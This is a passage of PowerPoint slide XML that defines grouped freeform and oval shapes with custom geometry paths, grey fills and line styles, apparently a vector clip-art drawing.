                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="56" name="Freeform 40"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5106" y="1868"/>
                      <a:ext cx="399" cy="233"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1595"/>
                        <a:gd name="T1" fmla="*/ 0 h 698"/>
                        <a:gd name="T2" fmla="*/ 0 w 1595"/>
                        <a:gd name="T3" fmla="*/ 0 h 698"/>
                        <a:gd name="T4" fmla="*/ 0 w 1595"/>
                        <a:gd name="T5" fmla="*/ 0 h 698"/>
                        <a:gd name="T6" fmla="*/ 0 w 1595"/>
                        <a:gd name="T7" fmla="*/ 0 h 698"/>
                        <a:gd name="T8" fmla="*/ 0 w 1595"/>
                        <a:gd name="T9" fmla="*/ 0 h 698"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1595"/>
                        <a:gd name="T16" fmla="*/ 0 h 698"/>
                        <a:gd name="T17" fmla="*/ 1595 w 1595"/>
                        <a:gd name="T18" fmla="*/ 698 h 698"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1595" h="698">
                          <a:moveTo>
                            <a:pt x="0" y="621"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="123" y="698"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1595" y="80"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1477" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="62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0" name="Group 41"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5145" y="1903"/>
                    <a:ext cx="397" cy="476"/>
                    <a:chOff x="5145" y="1903"/>
                    <a:chExt cx="397" cy="476"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="51" name="Freeform 42"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5176" y="1930"/>
                      <a:ext cx="366" cy="449"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1467"/>
                        <a:gd name="T1" fmla="*/ 0 h 1349"/>
                        <a:gd name="T2" fmla="*/ 0 w 1467"/>
                        <a:gd name="T3" fmla="*/ 0 h 1349"/>
                        <a:gd name="T4" fmla="*/ 0 w 1467"/>
                        <a:gd name="T5" fmla="*/ 0 h 1349"/>
                        <a:gd name="T6" fmla="*/ 0 w 1467"/>
                        <a:gd name="T7" fmla="*/ 0 h 1349"/>
                        <a:gd name="T8" fmla="*/ 0 w 1467"/>
                        <a:gd name="T9" fmla="*/ 0 h 1349"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1467"/>
                        <a:gd name="T16" fmla="*/ 0 h 1349"/>
                        <a:gd name="T17" fmla="*/ 1467 w 1467"/>
                        <a:gd name="T18" fmla="*/ 1349 h 1349"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1467" h="1349">
                          <a:moveTo>
                            <a:pt x="0" y="1349"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="0" y="614"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1467" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1463" y="689"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="1349"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="404040"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="52" name="Freeform 43"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5145" y="2109"/>
                      <a:ext cx="31" cy="270"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 121"/>
                        <a:gd name="T1" fmla="*/ 0 h 811"/>
                        <a:gd name="T2" fmla="*/ 0 w 121"/>
                        <a:gd name="T3" fmla="*/ 0 h 811"/>
                        <a:gd name="T4" fmla="*/ 0 w 121"/>
                        <a:gd name="T5" fmla="*/ 0 h 811"/>
                        <a:gd name="T6" fmla="*/ 0 w 121"/>
                        <a:gd name="T7" fmla="*/ 0 h 811"/>
                        <a:gd name="T8" fmla="*/ 0 w 121"/>
                        <a:gd name="T9" fmla="*/ 0 h 811"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 121"/>
                        <a:gd name="T16" fmla="*/ 0 h 811"/>
                        <a:gd name="T17" fmla="*/ 121 w 121"/>
                        <a:gd name="T18" fmla="*/ 811 h 811"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="121" h="811">
                          <a:moveTo>
                            <a:pt x="1" y="0"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="121" y="76"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="121" y="811"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="734"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1" y="0"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="606060"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="53" name="Freeform 44"/>
                    <p:cNvSpPr>
                      <a:spLocks/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5145" y="1903"/>
                      <a:ext cx="397" cy="231"/>
                    </a:xfrm>
                    <a:custGeom>
                      <a:avLst/>
                      <a:gdLst>
                        <a:gd name="T0" fmla="*/ 0 w 1588"/>
                        <a:gd name="T1" fmla="*/ 0 h 695"/>
                        <a:gd name="T2" fmla="*/ 0 w 1588"/>
                        <a:gd name="T3" fmla="*/ 0 h 695"/>
                        <a:gd name="T4" fmla="*/ 0 w 1588"/>
                        <a:gd name="T5" fmla="*/ 0 h 695"/>
                        <a:gd name="T6" fmla="*/ 0 w 1588"/>
                        <a:gd name="T7" fmla="*/ 0 h 695"/>
                        <a:gd name="T8" fmla="*/ 0 w 1588"/>
                        <a:gd name="T9" fmla="*/ 0 h 695"/>
                        <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                        <a:gd name="T15" fmla="*/ 0 w 1588"/>
                        <a:gd name="T16" fmla="*/ 0 h 695"/>
                        <a:gd name="T17" fmla="*/ 1588 w 1588"/>
                        <a:gd name="T18" fmla="*/ 695 h 695"/>
                      </a:gdLst>
                      <a:ahLst/>
                      <a:cxnLst>
                        <a:cxn ang="T10">
                          <a:pos x="T0" y="T1"/>
                        </a:cxn>
                        <a:cxn ang="T11">
                          <a:pos x="T2" y="T3"/>
                        </a:cxn>
                        <a:cxn ang="T12">
                          <a:pos x="T4" y="T5"/>
                        </a:cxn>
                        <a:cxn ang="T13">
                          <a:pos x="T6" y="T7"/>
                        </a:cxn>
                        <a:cxn ang="T14">
                          <a:pos x="T8" y="T9"/>
                        </a:cxn>
                      </a:cxnLst>
                      <a:rect l="T15" t="T16" r="T17" b="T18"/>
                      <a:pathLst>
                        <a:path w="1588" h="695">
                          <a:moveTo>
                            <a:pt x="0" y="618"/>
                          </a:moveTo>
                          <a:lnTo>
                            <a:pt x="121" y="695"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1588" y="81"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="1466" y="0"/>
                          </a:lnTo>
                          <a:lnTo>
                            <a:pt x="0" y="618"/>
                          </a:lnTo>
                          <a:close/>
                        </a:path>
                      </a:pathLst>
                    </a:custGeom>
                    <a:solidFill>
                      <a:srgbClr val="A0A0A0"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="C0C0C0"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
              </p:grpSp>
            </p:grpSp>
            <p:grpSp>
              <p:nvGrpSpPr>
                <p:cNvPr id="38" name="Group 45"/>
                <p:cNvGrpSpPr>
                  <a:grpSpLocks/>
                </p:cNvGrpSpPr>
                <p:nvPr/>
              </p:nvGrpSpPr>
              <p:grpSpPr bwMode="auto">
                <a:xfrm>
                  <a:off x="5311" y="2059"/>
                  <a:ext cx="120" cy="185"/>
                  <a:chOff x="5311" y="2059"/>
                  <a:chExt cx="120" cy="185"/>
                </a:xfrm>
              </p:grpSpPr>
              <p:grpSp>
                <p:nvGrpSpPr>
                  <p:cNvPr id="39" name="Group 46"/>
                  <p:cNvGrpSpPr>
                    <a:grpSpLocks/>
                  </p:cNvGrpSpPr>
                  <p:nvPr/>
                </p:nvGrpSpPr>
                <p:grpSpPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5311" y="2059"/>
                    <a:ext cx="120" cy="185"/>
                    <a:chOff x="5311" y="2059"/>
                    <a:chExt cx="120" cy="185"/>
                  </a:xfrm>
                </p:grpSpPr>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="41" name="Oval 47"/>
                    <p:cNvSpPr>
                      <a:spLocks noChangeArrowheads="1"/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5311" y="2059"/>
                      <a:ext cx="115" cy="180"/>
                    </a:xfrm>
                    <a:prstGeom prst="ellipse">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
                <p:sp>
                  <p:nvSpPr>
                    <p:cNvPr id="42" name="Oval 48"/>
                    <p:cNvSpPr>
                      <a:spLocks noChangeArrowheads="1"/>
                    </p:cNvSpPr>
                    <p:nvPr/>
                  </p:nvSpPr>
                  <p:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="5316" y="2065"/>
                      <a:ext cx="115" cy="179"/>
                    </a:xfrm>
                    <a:prstGeom prst="ellipse">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:solidFill>
                      <a:srgbClr val="606060"/>
                    </a:solidFill>
                    <a:ln w="4763">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                      <a:round/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </p:spPr>
                  <p:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
                    </a:p>
                  </p:txBody>
                </p:sp>
              </p:grpSp>
              <p:sp>
                <p:nvSpPr>
                  <p:cNvPr id="40" name="Freeform 49"/>
                  <p:cNvSpPr>
                    <a:spLocks/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5363" y="2101"/>
                    <a:ext cx="15" cy="100"/>
                  </a:xfrm>
                  <a:custGeom>
                    <a:avLst/>
                    <a:gdLst>
                      <a:gd name="T0" fmla="*/ 0 w 61"/>
                      <a:gd name="T1" fmla="*/ 0 h 299"/>
                      <a:gd name="T2" fmla="*/ 0 w 61"/>
                      <a:gd name="T3" fmla="*/ 0 h 299"/>
                      <a:gd name="T4" fmla="*/ 0 w 61"/>
                      <a:gd name="T5" fmla="*/ 0 h 299"/>
                      <a:gd name="T6" fmla="*/ 0 w 61"/>
                      <a:gd name="T7" fmla="*/ 0 h 299"/>
                      <a:gd name="T8" fmla="*/ 0 w 61"/>
                      <a:gd name="T9" fmla="*/ 0 h 299"/>
                      <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T15" fmla="*/ 0 w 61"/>
                      <a:gd name="T16" fmla="*/ 0 h 299"/>
                      <a:gd name="T17" fmla="*/ 61 w 61"/>
                      <a:gd name="T18" fmla="*/ 299 h 299"/>
                    </a:gdLst>
                    <a:ahLst/>
                    <a:cxnLst>
                      <a:cxn ang="T10">
                        <a:pos x="T0" y="T1"/>
                      </a:cxn>
                      <a:cxn ang="T11">
                        <a:pos x="T2" y="T3"/>
                      </a:cxn>
                      <a:cxn ang="T12">
                        <a:pos x="T4" y="T5"/>
                      </a:cxn>
                      <a:cxn ang="T13">
                        <a:pos x="T6" y="T7"/>
                      </a:cxn>
                      <a:cxn ang="T14">
                        <a:pos x="T8" y="T9"/>
                      </a:cxn>
                    </a:cxnLst>
                    <a:rect l="T15" t="T16" r="T17" b="T18"/>
                    <a:pathLst>
                      <a:path w="61" h="299">
                        <a:moveTo>
                          <a:pt x="0" y="20"/>
                        </a:moveTo>
                        <a:lnTo>
                          <a:pt x="61" y="0"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="61" y="280"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="299"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="20"/>
                        </a:lnTo>
                        <a:close/>
                      </a:path>
                    </a:pathLst>
                  </a:custGeom>
                  <a:solidFill>
                    <a:srgbClr val="404040"/>
                  </a:solidFill>
                  <a:ln w="4763">
                    <a:solidFill>
                      <a:srgbClr val="C0C0C0"/>
                    </a:solidFill>
                    <a:round/>
                    <a:headEnd/>
                    <a:tailEnd/>
                  </a:ln>
                </p:spPr>
                <p:txBody>
                  <a:bodyPr/>
                  <a:lstStyle/>
                  <a:p>
                    <a:endParaRPr lang="zh-CN" altLang="en-US"/>
                  </a:p>
                </p:txBody>
              </p:sp>
            </p:grpSp>
          </p:grpSp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="8" name="Group 50"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="5370" y="2057"/>
              <a:ext cx="600" cy="262"/>
              <a:chOff x="5370" y="2057"/>
              <a:chExt cx="600" cy="262"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="9" name="Freeform 51"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="5482" y="2157"/>
                <a:ext cx="71" cy="30"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 281"/>
                  <a:gd name="T1" fmla="*/ 0 h 88"/>
                  <a:gd name="T2" fmla="*/ 0 w 281"/>
                  <a:gd name="T3" fmla="*/ 0 h 88"/>
                  <a:gd name="T4" fmla="*/ 0 w 281"/>
                  <a:gd name="T5" fmla="*/ 0 h 88"/>
                  <a:gd name="T6" fmla="*/ 0 w 281"/>
                  <a:gd name="T7" fmla="*/ 0 h 88"/>
                  <a:gd name="T8" fmla="*/ 0 w 281"/>
                  <a:gd name="T9" fmla="*/ 0 h 88"/>
                  <a:gd name="T10" fmla="*/ 0 w 281"/>
                  <a:gd name="T11" fmla="*/ 0 h 88"/>
                  <a:gd name="T12" fmla="*/ 0 w 281"/>
                  <a:gd name="T13" fmla="*/ 0 h 88"/>
                  <a:gd name="T14" fmla="*/ 0 w 281"/>
                  <a:gd name="T15" fmla="*/ 0 h 88"/>
                  <a:gd name="T16" fmla="*/ 0 w 281"/>
                  <a:gd name="T17" fmla="*/ 0 h 88"/>
                  <a:gd name="T18" fmla="*/ 0 w 281"/>
                  <a:gd name="T19" fmla="*/ 0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1"/>
                  <a:gd name="T31" fmla="*/ 0 h 88"/>
                  <a:gd name="T32" fmla="*/ 281 w 281"/>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1" h="88">
                    <a:moveTo>
                      <a:pt x="0" y="88"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="14" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="36"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="76" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="109" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="152" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="192" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="234" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="257" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="281" y="38"/>
                    </a:lnTo>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:noFill/>
              <a:ln w="15875">
                <a:solidFill>
                  <a:srgbClr val="C0C0C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0" name="Group 52"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm>
                <a:off x="5370" y="2067"/>
                <a:ext cx="152" cy="252"/>
                <a:chOff x="5370" y="2067"/>
                <a:chExt cx="152" cy="252"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:grpSp>
              <p:nvGrpSpPr>
                <p:cNvPr id="26" name="Group 53"/>
                <p:cNvGrpSpPr>
                  <a:grpSpLocks/>
                </p:cNvGrpSpPr>
                <p:nvPr/>
              </p:nvGrpSpPr>
              <p:grpSpPr bwMode="auto">
                <a:xfrm>
                  <a:off x="5370" y="2106"/>
                  <a:ext cx="132" cy="181"/>
                  <a:chOff x="5370" y="2106"/>
                  <a:chExt cx="132" cy="181"/>
                </a:xfrm>
              </p:grpSpPr>
              <p:sp>
                <p:nvSpPr>
                  <p:cNvPr id="32" name="Freeform 54"/>
                  <p:cNvSpPr>
                    <a:spLocks/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5370" y="2111"/>
                    <a:ext cx="122" cy="176"/>
                  </a:xfrm>
                  <a:custGeom>
                    <a:avLst/>
                    <a:gdLst>
                      <a:gd name="T0" fmla="*/ 0 w 490"/>
                      <a:gd name="T1" fmla="*/ 0 h 528"/>
                      <a:gd name="T2" fmla="*/ 0 w 490"/>
                      <a:gd name="T3" fmla="*/ 0 h 528"/>
                      <a:gd name="T4" fmla="*/ 0 w 490"/>
                      <a:gd name="T5" fmla="*/ 0 h 528"/>
                      <a:gd name="T6" fmla="*/ 0 w 490"/>
                      <a:gd name="T7" fmla="*/ 0 h 528"/>
                      <a:gd name="T8" fmla="*/ 0 w 490"/>
                      <a:gd name="T9" fmla="*/ 0 h 528"/>
                      <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T15" fmla="*/ 0 w 490"/>
                      <a:gd name="T16" fmla="*/ 0 h 528"/>
                      <a:gd name="T17" fmla="*/ 490 w 490"/>
                      <a:gd name="T18" fmla="*/ 528 h 528"/>
                    </a:gdLst>
                    <a:ahLst/>
                    <a:cxnLst>
                      <a:cxn ang="T10">
                        <a:pos x="T0" y="T1"/>
                      </a:cxn>
                      <a:cxn ang="T11">
                        <a:pos x="T2" y="T3"/>
                      </a:cxn>
                      <a:cxn ang="T12">
                        <a:pos x="T4" y="T5"/>
                      </a:cxn>
                      <a:cxn ang="T13">
                        <a:pos x="T6" y="T7"/>
                      </a:cxn>
                      <a:cxn ang="T14">
                        <a:pos x="T8" y="T9"/>
                      </a:cxn>
                    </a:cxnLst>
                    <a:rect l="T15" t="T16" r="T17" b="T18"/>
                    <a:pathLst>
                      <a:path w="490" h="528">
                        <a:moveTo>
                          <a:pt x="0" y="0"/>
                        </a:moveTo>
                        <a:lnTo>
                          <a:pt x="0" y="246"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="490" y="528"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="490" y="285"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="0"/>
                        </a:lnTo>
                        <a:close/>
                      </a:path>
                    </a:pathLst>
                  </a:custGeom>
                  <a:solidFill>
                    <a:srgbClr val="A0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55"/>
                  <p:cNvSpPr>
                    <a:spLocks/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5370" y="2106"/>
                    <a:ext cx="132" cy="100"/>
                  </a:xfrm>
                  <a:custGeom>
                    <a:avLst/>
                    <a:gdLst>
                      <a:gd name="T0" fmla="*/ 0 w 529"/>
                      <a:gd name="T1" fmla="*/ 0 h 300"/>
                      <a:gd name="T2" fmla="*/ 0 w 529"/>
                      <a:gd name="T3" fmla="*/ 0 h 300"/>
                      <a:gd name="T4" fmla="*/ 0 w 529"/>
                      <a:gd name="T5" fmla="*/ 0 h 300"/>
                      <a:gd name="T6" fmla="*/ 0 w 529"/>
                      <a:gd name="T7" fmla="*/ 0 h 300"/>
                      <a:gd name="T8" fmla="*/ 0 w 529"/>
                      <a:gd name="T9" fmla="*/ 0 h 300"/>
                      <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T15" fmla="*/ 0 w 529"/>
                      <a:gd name="T16" fmla="*/ 0 h 300"/>
                      <a:gd name="T17" fmla="*/ 529 w 529"/>
                      <a:gd name="T18" fmla="*/ 300 h 300"/>
                    </a:gdLst>
                    <a:ahLst/>
                    <a:cxnLst>
                      <a:cxn ang="T10">
                        <a:pos x="T0" y="T1"/>
                      </a:cxn>
                      <a:cxn ang="T11">
                        <a:pos x="T2" y="T3"/>
                      </a:cxn>
                      <a:cxn ang="T12">
                        <a:pos x="T4" y="T5"/>
                      </a:cxn>
                      <a:cxn ang="T13">
                        <a:pos x="T6" y="T7"/>
                      </a:cxn>
                      <a:cxn ang="T14">
                        <a:pos x="T8" y="T9"/>
                      </a:cxn>
                    </a:cxnLst>
                    <a:rect l="T15" t="T16" r="T17" b="T18"/>
                    <a:pathLst>
                      <a:path w="529" h="300">
                        <a:moveTo>
                          <a:pt x="0" y="15"/>
                        </a:moveTo>
                        <a:lnTo>
                          <a:pt x="489" y="300"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="529" y="286"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="37" y="0"/>
                        </a:lnTo>
                        <a:lnTo>
                          <a:pt x="0" y="15"/>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56"/>
                  <p:cNvSpPr>
                    <a:spLocks/>
                  </p:cNvSpPr>
                  <p:nvPr/>
                </p:nvSpPr>
                <p:spPr bwMode="auto">
                  <a:xfrm>
                    <a:off x="5491" y="2201"/>
                    <a:ext cx="11" cy="85"/>
                  </a:xfrm>
                  <a:custGeom>
                    <a:avLst/>
                    <a:gdLst>
                      <a:gd name="T0" fmla="*/ 0 w 41"/>
                      <a:gd name="T1" fmla="*/ 0 h 255"/>
                      <a:gd name="T2" fmla="*/ 0 w 41"/>
                      <a:gd name="T3" fmla="*/ 0 h 255"/>
                      <a:gd name="T4" fmla="*/ 0 w 41"/>
                      <a:gd name="T5" fmla="*/ 0 h 255"/>
                      <a:gd name="T6" fmla="*/ 0 w 41"/>
                      <a:gd name="T7" fmla="*/ 0 h 255"/>
                      <a:gd name="T8" fmla="*/ 0 w 41"/>
                      <a:gd name="T9" fmla="*/ 0 h 255"/>
                      <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                      <a:gd name="T15" fmla="*/ 0 w 41"/>
                      <a:gd name="T16" fmla="*/ 0 h 255"/>
